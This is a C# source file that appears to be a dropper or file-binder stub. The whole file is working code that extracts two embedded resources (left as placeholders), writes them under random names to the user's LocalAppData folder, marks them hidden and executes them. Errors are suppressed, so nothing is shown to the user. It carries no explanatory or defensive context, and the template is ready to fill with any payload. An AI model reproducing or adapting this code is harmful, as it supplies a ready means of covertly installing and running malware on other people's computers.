using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Reflection;
using System.Diagnostics;

namespace SystemForm
{
    internal static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            new Thread(() => ExtractAndExecuteSaveResource(@"[Assembly-File1]")).Start();
            new Thread(() => ExtractAndExecuteSaveResource(@"[Assembly-File2]")).Start();
        }

        private static string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static void ExtractAndExecuteSaveResource(string filename)
        {
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(filename);
                if (stream != null)
                {
                    string path = Path.Combine(localAppDataPath, RandomString(6) + Path.GetExtension(filename));
                    byte[] buffer = new byte[stream.Length];
                    stream.Read(buffer, 0, (int)stream.Length);
                    stream.Close();
                    File.WriteAllBytes(path, buffer);
                    File.SetAttributes(path, FileAttributes.Hidden);
                    Process p = Process.Start(path);
                    return;
                }
                else return;
            }
            catch (Exception) { return; }
        }

        public static string RandomString(int length)
        {
            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random(Guid.NewGuid().GetHashCode());
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}